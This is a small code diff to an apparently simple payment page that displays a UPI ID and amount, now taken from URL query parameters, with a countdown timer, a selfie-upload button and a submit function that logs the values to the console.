@@ -12,6 +12,8 @@
       align-items:center;
       height:100vh;
       margin:0;
+      transform: scale(0.95);
+      transform-origin: top center;
     }
 
     .card{
@@ -108,9 +110,13 @@
 
 <script>
 
-let upiID = "saeed@upi";
-let amountValue = 1200;
+// ✅ URL SE DATA AAYEGA
+const params = new URLSearchParams(window.location.search);
 
+let upiID = params.get("upi") || "example@upi";
+let amountValue = params.get("amount") || 500;
+
+// SHOW ON PAGE
 document.getElementById("upiBox").innerText = upiID;
 document.getElementById("amountBox").innerText = amountValue;
 
@@ -125,7 +131,7 @@ function openSelfie(){
   document.getElementById("selfie").click();
 }
 
-// TIMER (8 MIN = 480 seconds)
+// TIMER (8 MIN)
 let timeLeft = 8 * 60;
 let timerEl = document.getElementById("time");
 
@@ -150,6 +156,10 @@ updateTimer();
 // SUBMIT
 function submitData(){
   alert("Submitted Successfully");
+  console.log({
+    upi: upiID,
+    amount: amountValue
+  });
 }
 
 </script>
